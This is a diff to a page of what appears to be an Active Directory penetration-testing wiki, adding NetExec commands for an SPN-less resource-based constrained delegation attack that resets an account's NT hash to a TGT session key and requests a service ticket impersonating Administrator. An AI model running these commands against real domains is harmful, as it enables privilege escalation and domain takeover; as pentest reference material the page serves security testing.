@@ -1,5 +1,5 @@
 ---
-authors: ShutdownRepo, sckdev, jamarir
+authors: ShutdownRepo, sckdev, jamarir, azoxlpf
 category: ad
 ---
 
@@ -229,6 +229,20 @@ KRB5CCNAME='TGT.ccache' getST.py -u2u -impersonate "Administrator" -spn "host/ta
 changepasswd.py -hashes :TGTSessionKey -newhashes :OldNTHash 'domain'/'controlledaccountwithoutSPN'@'DomainController'
 ```
 
+This can also be achieved with [NetExec](https://github.com/Pennyw0rth/NetExec) (Python).
+
+```bash
+# Obtain a TGT for the SPN-less user and retrieve the session key
+nxc smb "$TARGET" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --generate-tgt "$USER"
+describeTicket.py "$USER.ccache"
+
+# Set the account's NT hash to the RC4 session key value from describeTicket.py
+nxc smb "$TARGET" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -M change-password -o NEWNTHASH='<rc4_session_key>'
+
+# Obtain the delegated service ticket through S4U2Self+U2U, followed by S4U2Proxy
+export KRB5CCNAME="$USER.ccache"
+nxc smb "$TARGET" --use-kcache --delegate Administrator --u2u
+```
 
 After these steps, the final service ticket can be used with [Pass-the-ticket](../ptt.md).
 
@@ -257,3 +271,5 @@ After these steps, the final service ticket can be used with [Pass-the-ticket](.
 [https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)
 
 [https://tttang.com/archive/1617/](https://tttang.com/archive/1617/)
+
+[https://www.netexec.wiki/smb-protocol/authentication/delegation](https://www.netexec.wiki/smb-protocol/authentication/delegation)
